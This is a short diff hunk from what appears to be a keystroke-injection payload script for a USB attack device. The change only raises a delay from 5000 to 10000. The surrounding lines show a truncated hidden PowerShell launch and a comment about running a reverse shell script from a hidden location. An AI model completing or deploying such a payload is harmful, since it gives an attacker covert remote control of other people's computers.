@@ -19,7 +19,7 @@ RUN WIN powershell -Command "& {Start-Process powershell -ArgumentList ('-Execut
 Q DELAY 500
 Q ENTER
 
-DELAY 5000
+DELAY 10000
 
 # Run reverse shell script from hidden location
 LED STAGE2
